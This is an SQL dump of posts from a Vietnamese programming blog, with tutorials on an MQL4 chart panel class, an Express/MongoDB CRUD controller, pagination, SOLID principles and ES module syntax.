(964, 1, '2021-03-11 06:02:34', '2021-03-10 23:02:34', '<h2>1. Chrome</h2>\r\n1. Xem % code được sử dụng sau khi load\r\n1 - Mở Chrome Dev Tool; \r\n\r\n2 - Nhấn Cmd + Shift + P hoặc Ctrl + Shift + P; \r\n\r\n3 - Nhập Phạm vi (Coverage) và chọn tùy chọn đầu tiên xuất hiện; \r\n4 - Nhấp vào nút load trên console để xem việc sử dụng code của toàn bộ tài nguyên của ứng dụng; \r\n\r\n<h2>2. Npm</h2>\r\nsource-map-explorer\r\n<blockquote>npm i source-map-explorer</blockquote>\r\n', 'Các vấn đề về tối ưu tốc độ Website', '', 'publish', 'open', 'open', '', 'cac-van-de-ve-toi-uu-toc-do-website', '', '', '2022-08-07 00:30:28', '2022-08-07 00:30:28', '', 0, 'https://duycode.com/?p=964', 0, 'post', '', 0),
(969, 1, '2021-04-07 01:45:16', '2021-04-06 18:45:16', '<h2>Class MT4Panel</h2>\r\n<pre>\r\n//+------------------------------------------------------------------+\r\n#property copyright \"Copyright 2021, MetaQuotes Software Corp.\"\r\n#property link      \"https://www.mql5.com\"\r\n#property strict\r\n\r\n//+------------------------------------------------------------------+\r\nbool CreateButton(string name) {\r\n    ResetLastError();\r\n    if(!ObjectCreate(0, name, OBJ_BUTTON, 0, 0, 0)) {\r\n        Print(__FUNCTION__, \"! Error code = \", GetLastError());\r\n        return(false);\r\n    }\r\n    ObjectSetInteger(0, name, OBJPROP_XDISTANCE, 100);\r\n    ObjectSetInteger(0, name, OBJPROP_YDISTANCE, 100);\r\n    ObjectSetInteger(0, name, OBJPROP_XSIZE, 50);\r\n    ObjectSetInteger(0, name, OBJPROP_YSIZE, 20);\r\n    ObjectSetInteger(0, name, OBJPROP_CORNER, CORNER_LEFT_UPPER);\r\n    ObjectSetString(0, name, OBJPROP_TEXT, \"Button\");\r\n    ObjectSetString(0, name, OBJPROP_FONT, \"Arial\");\r\n    ObjectSetInteger(0, name, OBJPROP_FONTSIZE, 10);\r\n    ObjectSetInteger(0, name, OBJPROP_COLOR, clrBlack);\r\n    ObjectSetInteger(0, name, OBJPROP_BGCOLOR, C\'236,233,216\');\r\n    ObjectSetInteger(0, name, OBJPROP_BORDER_COLOR, clrNONE);\r\n    ObjectSetInteger(0, name, OBJPROP_BACK, false);\r\n    ObjectSetInteger(0, name, OBJPROP_STATE, false);\r\n    ObjectSetInteger(0, name, OBJPROP_SELECTABLE, false);\r\n    ObjectSetInteger(0, name, OBJPROP_SELECTED, false);\r\n    ObjectSetInteger(0, name, OBJPROP_HIDDEN, true);\r\n    ObjectSetInteger(0, name, OBJPROP_ZORDER, 0);\r\n    return(true);\r\n}\r\n\r\n//+------------------------------------------------------------------+\r\nbool CreateEdit(string name) {\r\n    ResetLastError();\r\n    if(!ObjectCreate(0, name, OBJ_EDIT, 0, 0, 0)) {\r\n        Print(__FUNCTION__, \"! Error code = \", GetLastError());\r\n        return(false);\r\n    }\r\n    ObjectSetInteger(0, name, OBJPROP_XDISTANCE, 100);\r\n    ObjectSetInteger(0, name, OBJPROP_YDISTANCE, 100);\r\n    ObjectSetInteger(0, name, OBJPROP_XSIZE, 100);\r\n    ObjectSetInteger(0, name, OBJPROP_YSIZE, 20);\r\n    ObjectSetString(0, name, OBJPROP_TEXT, \"\");\r\n    ObjectSetString(0, name, OBJPROP_FONT, \"Arial\");\r\n    ObjectSetInteger(0, name, OBJPROP_FONTSIZE, 10);\r\n    ObjectSetInteger(0, name, OBJPROP_ALIGN, ALIGN_CENTER);\r\n    ObjectSetInteger(0, name, OBJPROP_READONLY, true);\r\n    ObjectSetInteger(0, name, OBJPROP_CORNER, CORNER_LEFT_UPPER);\r\n    ObjectSetInteger(0, name, OBJPROP_COLOR, clrBlack);\r\n    ObjectSetInteger(0, name, OBJPROP_BGCOLOR, clrWhite);\r\n    ObjectSetInteger(0, name, OBJPROP_BORDER_COLOR, clrDimGray);\r\n    ObjectSetInteger(0, name, OBJPROP_BACK, false);\r\n    ObjectSetInteger(0, name, OBJPROP_SELECTABLE, false);\r\n    ObjectSetInteger(0, name, OBJPROP_SELECTED, false);\r\n    ObjectSetInteger(0, name, OBJPROP_HIDDEN, true);\r\n    ObjectSetInteger(0, name, OBJPROP_ZORDER, 0);\r\n    return(true);\r\n}\r\n\r\n//+------------------------------------------------------------------+\r\nvoid ObjectSetXY(string name, int x, int y) {\r\n    ObjectSet(name, OBJPROP_XDISTANCE, x);\r\n    ObjectSet(name, OBJPROP_YDISTANCE, y);\r\n}\r\n\r\n//+------------------------------------------------------------------+\r\nvoid ObjectSetSize(string name, int width, int height) {\r\n    ObjectSet(name, OBJPROP_XSIZE, width);\r\n    ObjectSet(name, OBJPROP_YSIZE, height);\r\n}\r\n\r\n//+------------------------------------------------------------------+\r\nclass MT4Panel {\r\n  public:\r\n    string      itemsOld[];\r\n    string      background, title, btnClose, btnMinus;\r\n    struct      Item {\r\n        string  name;\r\n        int     x0;\r\n        int     y0;\r\n    };\r\n    Item        items[];\r\n    int         x, y, width, height, titHeight;\r\n    bool        MouseDown,\r\n                MouseOnTitle;\r\n    double      x0Mouse,\r\n                y0Mouse;\r\n\r\n    MT4Panel() {\r\n        this.x              = 200;\r\n        this.y              = 100;\r\n        this.width          = 400;\r\n        this.height         = 100;\r\n        this.titHeight      = 20;\r\n\r\n        this.MouseDown      = false;\r\n        this.MouseOnTitle   = false;\r\n        this.x0Mouse     = 0;\r\n        this.y0Mouse     = 0;\r\n\r\n        static int MyObject_ID = 0;\r\n        this.background = \"MT4Panel-background\" + MyObject_ID;\r\n        this.title = \"MT4Panel-title\" + MyObject_ID;\r\n        this.btnClose = \"MT4Panel-btnClose\" + MyObject_ID;\r\n        this.btnMinus = \"MT4Panel-btnMinus\" + MyObject_ID;\r\n        MyObject_ID++;\r\n        this.createModal();\r\n\r\n        ChartSetInteger(0, CHART_EVENT_MOUSE_MOVE, 1);\r\n    }\r\n\r\n    void createModal() {\r\n        CreateEdit(this.background);\r\n        ObjectSetInteger(0, this.background, OBJPROP_BGCOLOR, clrLavender);\r\n\r\n        CreateEdit(this.title);\r\n        ObjectSetInteger(0, this.title, OBJPROP_BGCOLOR, clrWhite);\r\n        ObjectSetInteger(0, this.title, OBJPROP_FONTSIZE, 12);\r\n        ObjectSetText(this.title, \"Dashboard MT4-Panel\");\r\n\r\n        CreateButton(this.btnClose);\r\n        ObjectSetInteger(0, this.btnClose, OBJPROP_BGCOLOR, clrWhite);\r\n        ObjectSetInteger(0, this.btnClose, OBJPROP_FONTSIZE, 12);\r\n        ObjectSetText(this.btnClose, \"x\");\r\n\r\n        CreateButton(this.btnMinus);\r\n        ObjectSetInteger(0, this.btnMinus, OBJPROP_BGCOLOR, clrWhite);\r\n        ObjectSetInteger(0, this.btnMinus, OBJPROP_FONTSIZE, 12);\r\n        ObjectSetText(this.btnMinus, \"-\");\r\n\r\n        this.addItem(this.background, 0, 0);\r\n        this.addItem(this.title, 0, 0);\r\n        this.addItem(this.btnClose, this.width - this.titHeight, 0);\r\n        this.addItem(this.btnMinus, this.width - this.titHeight * 2, 0);\r\n\r\n        this.drawSize();\r\n    }\r\n\r\n    void drawSize() {\r\n        ObjectSetSize(this.background, this.width, this.height);\r\n        ObjectSetSize(this.title, this.width - this.titHeight * 2, this.titHeight);\r\n        ObjectSetSize(this.btnClose, this.titHeight, this.titHeight);\r\n        ObjectSetSize(this.btnMinus, this.titHeight, this.titHeight);\r\n    }\r\n\r\n    void drawPosition() {\r\n        setItemPosition(this.btnClose, this.width - this.titHeight, 0);\r\n        setItemPosition(this.btnMinus, this.width - this.titHeight * 2, 0);\r\n    }\r\n\r\n    void setSize(int width, int height) {\r\n        this.width = width;\r\n        this.height = height;\r\n        drawSize();\r\n        drawPosition();\r\n    }\r\n\r\n    void setTitleHeight(int titHeight) {\r\n        this.titHeight = titHeight;\r\n        drawSize();\r\n        drawPosition();\r\n    }\r\n\r\n    void addItem(string name, int x0, int y0) {\r\n        int s = ArraySize(this.items);\r\n        ArrayResize(this.items, s + 1, 10);\r\n        this.items[s].name = name;\r\n        this.setItemPosition(s, x0, y0);\r\n    }\r\n\r\n    void setItemPosition(int i, int x0, int y0) {\r\n        this.items[i].x0 = x0;\r\n        this.items[i].y0 = y0;\r\n        ObjectSetXY(this.items[i].name, this.x + x0, this.y + y0);\r\n    }\r\n\r\n    void setItemPosition(string name, int x0, int y0) {\r\n        int s = ArraySize(this.items);\r\n        int n = -1;\r\n        for(int i = 0; i < s; i++) {\r\n            if(this.items[i].name == name) {\r\n                n = i;\r\n                break;\r\n            }\r\n        }\r\n        if(n > -1) setItemPosition(n, x0, y0);\r\n    }\r\n\r\n    void setPosition(int x, int y) {\r\n        this.x = x;\r\n        this.y = y;\r\n        int s = ArraySize(this.items);\r\n        for(int i = 0; i < s; i++) {\r\n            string n = this.items[i].name;\r\n            int xN = this.x + this.items[i].x0;\r\n            int yN = this.y + this.items[i].y0;\r\n            ObjectSetXY(n, xN, yN);\r\n        }\r\n    }\r\n\r\n    void showOnTop() {\r\n        bool state = ObjectGet(this.btnMinus, OBJPROP_STATE);\r\n        int s = ArraySize(this.items);\r\n        for(int i = 0; i < s; i++) {\r\n            ObjectSetInteger(0, this.items[i].name, OBJPROP_TIMEFRAMES, EMPTY);\r\n            if(!state) {\r\n                ObjectSetInteger(0, this.items[i].name, OBJPROP_TIMEFRAMES, OBJ_ALL_PERIODS);\r\n            } else if(state && 0 < i && i <= 3) {\r\n                ObjectSetInteger(0, this.items[i].name, OBJPROP_TIMEFRAMES, OBJ_ALL_PERIODS);\r\n            }\r\n        }\r\n    }\r\n\r\n    void deletePanel() {\r\n        int s = ArraySize(this.items);\r\n        for(int i = 0; i < s; i++) {\r\n            ObjectDelete(0, this.items[i].name);\r\n        }\r\n    }\r\n\r\n    void onEventPanel(int id, long lparam, double dparam, string sparam) {\r\n        if(id == CHARTEVENT_MOUSE_MOVE) {\r\n            if(sparam == \"1\" && !this.MouseDown) {\r\n                this.MouseDown = true;\r\n                this.x0Mouse = lparam - this.x;\r\n                this.y0Mouse = dparam - this.y;\r\n                if(this.x0Mouse > 0 && this.x0Mouse < this.width && this.y0Mouse > 0 && this.y0Mouse < this.titHeight) {\r\n                    this.MouseOnTitle = true;\r\n                    this.showOnTop();\r\n                }\r\n            }\r\n            //action when hold down mouse and move\r\n            if(sparam == \"1\" && this.MouseDown) {\r\n                if(this.MouseOnTitle) {\r\n                    int xNew = lparam - this.x0Mouse;\r\n                    int yNew = dparam - this.y0Mouse;\r\n\r\n                    int xMin = 100 - this.width;\r\n                    int yMin = 0;\r\n                    int xMax = ChartGetInteger(0, CHART_WIDTH_IN_PIXELS, 0) - 100;\r\n                    int yMax = ChartGetInteger(0, CHART_HEIGHT_IN_PIXELS, 0) - this.titHeight;\r\n\r\n                    if(xNew < xMin) xNew = xMin;\r\n                    if(yNew < yMin) yNew = yMin;\r\n                    if(xNew > xMax) xNew = xMax;\r\n                    if(yNew > yMax) yNew = yMax;\r\n\r\n                    this.setPosition(xNew, yNew);\r\n                    ChartSetInteger(ChartID(), CHART_MOUSE_SCROLL, 0);\r\n                }\r\n            }\r\n            //action when up mouse\r\n            if(sparam == \"0\" && this.MouseDown) {\r\n                this.MouseDown = false;\r\n                this.MouseOnTitle = false;\r\n                ChartSetInteger(ChartID(), CHART_MOUSE_SCROLL, 1);\r\n            }\r\n        }\r\n        if(id == CHARTEVENT_OBJECT_CLICK) {\r\n            if(sparam == this.btnMinus) {\r\n                this.showOnTop();\r\n            } else if(sparam == this.btnClose) {\r\n                this.deletePanel();\r\n            }\r\n        }\r\n    }\r\n};\r\n//+------------------------------------------------------------------+\r\n\r\n</pre>', 'MQL - Những Class hay nhất', '', 'publish', 'open', 'open', '', 'mql-nhung-class-hay-nhat', '', '', '2022-11-11 21:53:26', '2022-11-11 21:53:26', '', 0, 'https://duycode.com/?p=969', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(971, 1, '2021-05-07 00:00:57', '2021-05-06 17:00:57', '<h2>1. MongoDBController</h2>\n<pre>\nconst mongoDB = require(\'../../database/mongoDB\')\nconst ObjectId = require(\'mongodb\').ObjectId\n\nmodule.exports = class MongoDBController {\n    constructor (name){\n        this.name = name\n    }\n    all = async (req, res, next) => {\n        try {\n            let collection = mongoDB.getDB().collection(this.name)\n            let result = await collection.find({ removedAt: 0 }).toArray()\n            res.json({ data: result })\n        } catch (e) {\n            console.log(e)\n            res.json({ error: \'error\' })\n        }\n    }\n    trash = async (req, res, next) => {\n        try {\n            let collection = mongoDB.getDB().collection(this.name)\n            let result = await collection.find({ removedAt: { $ne: 0 } }).toArray()\n            res.json({ data: result })\n        } catch (e) {\n            console.log(e)\n            res.json({ error: \'error\' })\n        }\n    }\n    findID = async (req, res, next) => {\n        try {\n            let collection = mongoDB.getDB().collection(this.name)\n            let result = await collection.findOne({ _id: new ObjectId(req.params._id) })\n            res.json({ data: result })\n        } catch (e) {\n            console.log(e)\n            res.json({ error: \'error\' })\n        }\n    }\n    insert = async (req, res, next) => {\n        console.log(req.body)\n        try {\n            let newCollection = {\n                ...req.body,\n                createdAt: Date.now(),\n                updatedAt: Date.now(),\n                removedAt: 0,\n            }\n            let collection = mongoDB.getDB().collection(this.name)\n            let result = await collection.insertOne(newCollection)\n            res.json({ data: result })\n        } catch (error) {\n            console.log(error)\n            res.json({ error: error })\n        }\n    }\n    update = async (req, res, next) => {\n        try {\n            let collection = mongoDB.getDB().collection(this.name)\n            const result = await collection.findOneAndUpdate(\n                { _id: new ObjectId(req.params._id) },\n                { $set: { ...req.body, updatedAt: Date.now() } },\n                { upsert: false, returnDocument: \'after\' }\n            )\n            res.json({ data: result.value })\n        } catch (error) {\n            console.log(error)\n            res.json({ error: error })\n        }\n    }\n    replace = async (req, res, next) => {\n        try {\n            let newCollection = {\n                ...req.body,\n                createdAt: Date.now(),\n                updatedAt: Date.now(),\n                removedAt: 0,\n            }\n            let collection = mongoDB.getDB().collection(this.name)\n            const result = await collection.findOneAndReplace(\n                { _id: new ObjectId(req.params._id) },\n                newCollection,\n                { upsert: false, returnDocument: \'after\' }\n            )\n            console.log(result)\n            res.json({ data: result.value })\n        } catch (error) {\n            console.log(error)\n            res.json({ error: error })\n        }\n    }\n    remove = async (req, res, next) => {\n        try {\n            let collection = mongoDB.getDB().collection(this.name)\n            const result = await collection.findOneAndUpdate(\n                { _id: new ObjectId(req.params._id) },\n                { $set: { removedAt: Date.now() } },\n                { upsert: false, returnDocument: \'after\' }\n            )\n            res.json({ data: result.value })\n        } catch (error) {\n            console.log(error)\n            res.json({ error: error })\n        }\n    }\n    restore = async (req, res, next) => {\n        try {\n            let collection = mongoDB.getDB().collection(this.name)\n            const result = await collection.findOneAndUpdate(\n                { _id: new ObjectId(req.params._id) },\n                { $set: { removedAt: 0, updatedAt: Date.now() } },\n                { upsert: false, returnDocument: \'after\' }\n            )\n            res.json({ data: result.value })\n        } catch (error) {\n            console.log(error)\n            res.json({ error: error })\n        }\n    }\n    destroy = async (req, res, next) => {\n        try {\n            let collection = mongoDB.getDB().collection(this.name)\n            const result = await collection.deleteOne({\n                _id: new ObjectId(req.params._id),\n                removedAt: { $ne: 0 },\n            })\n            res.json({ data: result })\n        } catch (error) {\n            console.log(error)\n            res.json({ error: error })\n        }\n    }\n    //\n    insert_list = async (req, res, next) => {\n        try {\n        } catch (error) { }\n    }\n    remove_list = async (req, res, next) => {\n        try {\n            let _ids = req.body._ids.map((item) => new ObjectId(item))\n            let collection = mongoDB.getDB().collection(this.name)\n            const result = await collection.updateMany(\n                { _id: { $in: _ids } },\n                { $set: { removedAt: Date.now() } },\n                { upsert: false }\n            )\n            res.json({ data: result })\n        } catch (error) {\n            console.log(error)\n            res.json({ error: error })\n        }\n    }\n    restore_list = async (req, res, next) => {\n        try {\n            let _ids = req.body._ids.map((item) => new ObjectId(item))\n            let collection = mongoDB.getDB().collection(this.name)\n            const result = await collection.updateMany(\n                { _id: { $in: _ids } },\n                { $set: { removedAt: 0 } },\n                { upsert: false }\n            )\n            res.json({ data: result })\n        } catch (error) {\n            console.log(error)\n            res.json({ error: error })\n        }\n    }\n    destroy_list = async (req, res, next) => {\n        try {\n            let _ids = req.body._ids.map((item) => new ObjectId(item))\n            let collection = mongoDB.getDB().collection(this.name)\n            const result = await collection.deleteMany({ _id: { $in: _ids } })\n            res.json({ data: result })\n        } catch (error) {\n            console.log(error)\n            res.json({ error: error })\n        }\n    }\n    destroy_trash = async (req, res, next) => {\n        try {\n            let collection = mongoDB.getDB().collection(this.name)\n            const result = await collection.deleteMany({ removedAt: { $ne: 0 } })\n            res.json({ data: result })\n        } catch (error) {\n            console.log(error)\n            res.json({ error: error })\n        }\n    }\n    destroy_all = async (req, res, next) => {\n        try {\n            let collection = mongoDB.getDB().collection(this.name)\n            const result = await collection.deleteMany({})\n            res.json({ data: result })\n        } catch (error) {\n            console.log(error)\n            res.json({ error: error })\n        }\n    }\n}\n</pre>\n\n<h2>2. Các lệnh thường dùng</h2>\n2.1. Copy value to other field tất cả document\n<pre>\ndb.getCollection(\'tuthuocs\').update(\n	{},\n	[\n		{\n			$set: {\n				\'Gia.Nhap\': { $arrayElemAt: [ \'$HangTon.GiaNhap\', 0 ] },\n				\'Gia.BanLe\': \'$GiaBan.Le\',\n				\'Gia.BanSi\': \'$GiaBan.Si\',\n			},\n		},\n	],\n	{ multi: true }\n);\n</pre>\n\n2.2. Xóa field tất cả document\n<pre>\ndb.getCollection(\'tuthuocs\').update({}, {$unset: {GiaBan:1}} , {multi: true});\n</pre>\n\n\n\n2.3. Tạo field tất cả document\n<pre>\ndb.getCollection(\'tuthuocs\').update({}, {$set: {ManagerID: \"60ca1e69ecc5460004032c1c\"}}, {multi: true});\n</pre>\n\n2.* -- Khác\n<pre>\n//Xóa tất cả document\ndb.tuthuocs.remove({})\n</pre>\n', 'NodeJS – 7. NoSQL : P1. MongoDB Controller', '', 'publish', 'open', 'open', '', 'nodejs-7-nosql-p1-mongodb-controller', '', '', '2021-05-07 00:00:57', '2021-05-06 17:00:57', '', 0, 'https://duycode.com/?p=971', 0, 'post', '', 0),
(979, 1, '2021-05-08 15:59:22', '0000-00-00 00:00:00', '1. Develop tool for Chrome\n- React Developer Tools\n2. Cài Nodejs\n- Kiểm tra máy đã cài nodejs chưa, dùng cmd\nnode -v\nnpm -v\n3. Cài yarn\n4. Cài sublime Text 3\n5 Install Package Control for Sublime\n- Cài đặt các package:\nJSX/Babel Syntax Highlighting\nBabel Snippets\nEmmet\n\n6. Cài đặt ban đầu\ndùng cmd ở thư mục muốn cài\nnpx create-react-app my-app\ncd my-app\nnpm start\n', 'ReactJS - Cơ bản', '', 'draft', 'open', 'open', '', '', '', '', '2021-05-08 15:59:22', '0000-00-00 00:00:00', '', 0, 'https://duycode.com/?p=979', 0, 'post', '', 0),
(982, 1, '2021-05-14 10:51:46', '2021-05-14 03:51:46', '<h2>1. List vị trí hiện</h2>\r\n<pre>\r\npagination = (index, length, delta = 2) => {\r\n	let array = [],\r\n		left = index - delta - 1,\r\n		right = index + delta + 1;\r\n	for (let i = 1; i <= length; i++) {\r\n		if (\r\n			i == 1 ||\r\n			i == length ||\r\n			(i > left && i < right) ||\r\n			(i == 2 && left == 2) ||\r\n			(i == length - 1 && right == length - 1)\r\n		) {\r\n			array.push(i);\r\n		}\r\n	}\r\n	if (left > 2) {\r\n		array.splice(1, 0, \'...\');\r\n	}\r\n	if (right < length - 1) {\r\n		array.splice(-1, 0, \'...\');\r\n	}\r\n	return array;\r\n};\r\n</pre>\r\n-- Test thử\r\n<pre>\r\nfor (let i = 1, l = 20; i <= l; i++)\r\n    console.log(`Selected page ${i}:`, pagination(i, l));\r\n</pre>\r\n', 'Pagination - Phân trang trong ES6', '', 'publish', 'open', 'open', '', 'pagination-phan-trang-trong-es6', '', '', '2022-08-07 00:03:57', '2022-08-07 00:03:57', '', 0, 'https://duycode.com/?p=982', 0, 'post', '', 0),
(1012, 1, '2022-06-11 15:19:28', '2022-06-11 15:19:28', 'a. OOP (Object Oriented Programming) bao gồm các đặc tính sau\r\n- Tính đóng gói (Encapsulation): che giấu thông tin bên trong đối tượng\r\n- Tính kế thừa (Inheritance)\r\n- Tính đa hình (Polymorphism): các Instance của Class sẽ thực thi chức năng giống nhau theo cách khác nhau\r\n- Tính trừu tượng (Abstraction)\r\n\r\nb. SOLID bao gồm 5 nguyên tắc đó là:\r\n- Single responsibility principle (SRP)\r\n- Open/Closed principle (OCP)\r\n- Liskov substitution principe (LSP)\r\n- Interface segregation principle (ISP)\r\n- Dependency inversion principle (DIP)\r\n\r\n<h2>1. Single responsibility priciple (SRP)</h2>\r\n- Mỗi lớp chỉ nên chịu trách nhiệm về một nhiệm vụ cụ thể nào đó mà thôi.\r\n- Đặt vấn đề\r\n<pre>\r\nclass Book {\r\n  protected $Author;\r\n\r\n  public getAuthor($Author) {\r\n    return $this->Author;\r\n  }\r\n\r\n  public function formatJson() {\r\n    return json_encode($this->getAuthor());\r\n  }\r\n}\r\n// ==> Class Book làm cả công việc formatJSON ==> không hợp lý\r\n</pre>\r\n- Giải pháp\r\n<pre>\r\nclass Book {\r\n  protected $Author;\r\n\r\n  public getAuthor($Author){\r\n    return $this->Author;\r\n  }\r\n}\r\n\r\nclass Format{\r\n    public function formatJSON(Book $Author) {\r\n        return json_encode($Author->getAuthor());\r\n    }\r\n    public function formatHex(Book $Author) {\r\n        return hex_encode($Author->getAuthor());\r\n    }\r\n}\r\n// ==> Thằng nào làm công việc của thằng đấy thôi\r\n</pre>\r\n\r\n<h2>2. Open/Closed principle (OCP)</h2>\r\n- Không được sửa đổi một Class có sẵn, nhưng có thể mở rộng bằng kế thừa.\r\n\r\n\r\n<h2>3. Liskov substitution principe (LSP)</h2>\r\n- Trong một chương trình, các object của class con có thể thay thế class cha mà không làm thay đổi tính đúng đắn của chương trình\r\n- Đặt vấn đề\r\n<pre>\r\ninterface Bird {\r\n    void eat();\r\n    void fly();\r\n}\r\nclass ChimSe implement Bird {\r\n    // ==> ok\r\n}\r\nclass ChimCanhCut implement Bird {\r\n    function fly() {\r\n        throw new Exceptions(\'Chim Cánh Cụt không thể bay\')\r\n    }\r\n    // ==> chỉ vì class này mà gây lỗi chương trình\r\n}\r\n</pre>\r\n- Giải pháp: tách chim cánh cụt ra interface riêng\r\n\r\n<h2>4. Interface segregation principle</h2>\r\n- Một client không bao giờ bị buộc phải thực hiện một interface mà nó không sử dụng hoặc client không nên bị buộc phải phụ thuộc vào các phương thức mà chúng không sử dụng.\r\n- Thay vì dùng 1 interface lớn, ta nên tách thành nhiều interface nhỏ, với nhiều mục đích cụ thể.\r\n- Đặt vấn đề\r\n<pre>\r\ninterface Employee {\r\n    public function clockin()\r\n    public function clockout()\r\n    public function customerService()\r\n    public function generateReport()\r\n}\r\n\r\nclass Staff implements Employee {\r\n    public function generateReport() {\r\n         // ==> thật vô lý nếu 1 nhân viên thông thường phải xuất báo cáo\r\n    }\r\n}\r\n</pre>\r\n- Giải pháp\r\n<pre>\r\ninterface GeneralEmployee {\r\n    public function clockin()\r\n    public function clockout()\r\n}\r\n\r\ninterface Employee {\r\n    public function customerService()\r\n}\r\n\r\ninterface Management {\r\n    public function generateReport()\r\n}\r\n\r\nclass Staff implements GeneralEmployee, Employee {\r\n}\r\n\r\nclass Manager implements GeneralEmployee, Management {\r\n}\r\n</pre>\r\n\r\n<h2>5. Dependency inversion principle (DIP)</h2>\r\n- Các module cấp cao không nên phụ thuộc vào các modules cấp thấp. Cả 2 nên phụ thuộc vào abstraction.\r\n- Interface (abstraction) không nên phụ thuộc vào chi tiết, mà ngược lại (Các class giao tiếp với nhau thông qua interface)\r\n- Đặt vấn đề:\r\n<pre>\r\nclass ConnectionManager {\r\n    public MySql connection;\r\n\r\n    public function doConnection(MySql connection) {\r\n        this.connection.doConnect()\r\n        // ==> không thể dùng connect khác như SQLServer, Oracle\r\n        // ==> Lỗi phổ biến vì theo cấu trúc phân cấp, class ConnectionManager là mô-đun cao hơn và MySQL là mô-đun thấp hơn.\r\n    }\r\n}\r\n</pre>\r\n\r\n- Giải pháp:\r\n<pre>\r\ninterface IConnection() {\r\n    public doConnect();\r\n}\r\n\r\nclass SqlServer implements IConnection {\r\n    public function doConnect() {}\r\n}\r\n\r\nclass MySql implements IConnection {\r\n    public function doConnect() {}\r\n}\r\n\r\nclass ConnectionManager {\r\n    public IConnection connection\r\n    public function doConnection(IConnection connection) {\r\n        this.connection.doConnect()\r\n    }\r\n}\r\n// ==> Giờ cả ConnectionManager và MySql đều phụ thuộc vào IConnection\r\n</pre>', 'OOP, SOLID trong lập trình hướng đối tượng', '', 'publish', 'open', 'open', '', 'oop-solid-trong-lap-trinh-huong-doi-tuong', '', '', '2023-06-17 12:07:41', '2023-06-17 12:07:41', '', 0, 'https://duycode.com/?p=1012', 0, 'post', '', 0),
(1038, 1, '2021-01-01 02:00:05', '2020-12-31 19:00:05', '<h2>A. Cú pháp</h2>\n<pre>\n// Name export/import\nexport const name = \'value\';\nimport { name } from \'/module/my-module.js\';\n\n// Default export/import\nexport default \'value\';\nimport anyName from \'/module/my-module.js\';\n\n// Rename import\nexport { name as newName };\nimport { newName } from \'/module/my-module.js\';\n\n// Export list + rename | Import list + rename\nexport { name1, name2 as newName2 };\nimport { name1 as newName1, newName2 } from \'/module/my-module.js\';\n\n// Named export + default export | Import all module\'s contents\nexport const name = \'value\';\nexport default \'defaultValue\';\nimport * as anyName from \'/module/my-module.js\';\nconsole.log(anyName); // Module { name: \'value\', default: \'defaultValue\' }\nconsole.log(anyName.name); // \'value\'\nconsole.log(anyName.default); // \'defaultName\'\n\n// Default + Named export\nexport const name = \'value1\';\nexport default \'value2\';\nimport anyName, { name } from \'/modules/my-module.js\';\n\n// Export list => không phải là object nhé\nconst name1 = \'value1\';\nconst name2 = \'value2\';\nexport { name1, name2 };\n\nimport { name1, name2 } from \'/modules/my-module.js\';\nconsole.log(name1); // \'value1\'\nconsole.log(name2); // \'value2\'\n\n//Kết hợp import và export\n//Thông thường\nimport logger from \'./logger.js\' \nexport default logger;\n//Cách khác\nexport {default} from \'./logger.js\'\nexport {default as debugger} from \'./logger.js\'\n</pre>\n\n<h2>B. Sử dụng </h2>\n<h3>1. Sử dụng trên CDN dạng type=\"module\"</h3>\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n<body>\n    <script type=\"module\">\n        import {demoData} from \'/demo-export.js\'\n        console.log(demoData);\n    </script>\n</body>\n</html>\n\n<!-- Tại file: /demo-export.js -->\n<!-- export const demoData = {a: 2, b: 3} -->\n</pre>\n\n<h3>2. Sử dụng trên CDN với babel version 6</h3>\nNguồn: <a href=\"https://stackoverflow.com/questions/53972473/how-to-perform-import-export-in-client-side-react-jsx-using-babel-standalone/53975781#53975781\" rel=\"noopener\" target=\"_blank\">https://stackoverflow.com/questions/53972473/how-to-perform-import-export-in-client-side-react-jsx-using-babel-standalone/53975781#53975781</a>\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>React JSX Babel-Standalone Import/Export Problem</title>\n</head>\n\n<body>\n    <div id=\"root\"></div>\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n\n\n    <script data-plugins=\"transform-es2015-modules-umd\" type=\"text/babel\" src=\"./MyExport.js\"></script>\n    <script data-plugins=\"transform-es2015-modules-umd\" type=\"text/babel\">\n        import MyExport from \"./MyExport\";\n        const App = () => {\n            return (\n                <MyExport />\n            );\n        };\n        ReactDOM.render(<App />, document.querySelector(\"#root\"));\n    </script>\n\n    <!-- MyExport.js:\n    const MyExport = () => {\n        return (\n            <div>MyExport element is imported!</div>\n        );\n    };\n    export default MyExport;\n    -->\n</body>\n\n</html>\n</pre>\n\n<h3>3. Sử dụng với babel 7</h3>\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <title>React JSX Babel-Standalone Import/Export Problem</title>\n</head>\n\n<body>\n    <div id=\"root\"></div>\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/@babel/standalone@7.11.4/babel.js\"></script>\n\n\n    <script data-plugins=\"transform-modules-umd\" data-presets=\"react\" data-type=\"module\" type=\"text/babel\" src=\"./MyExport.js\"></script>\n    <script data-plugins=\"transform-modules-umd\" data-presets=\"react\" data-type=\"module\" type=\"text/babel\">\n        import MyExport from \"./MyExport\";\n        const App = () => {\n            return (\n                <MyExport />\n            );\n        };\n        ReactDOM.render(<App />, document.querySelector(\"#root\"));\n    </script>\n\n    <!-- MyExport.js:\n    const MyExport = () => {\n        return (\n            <div>MyExport element is imported!</div>\n        );\n    };\n    export default MyExport;\n    -->\n</body>\n\n</html>\n</pre>', 'JS Module – 2. ESM: Ecmascript Module Syntax', '', 'publish', 'open', 'open', '', 'js-module-2-esm-ecmascript-module-syntax', '', '', '2021-01-01 02:00:05', '2020-12-31 19:00:05', '', 0, 'https://duycode.com/?p=1038', 0, 'post', '', 0),
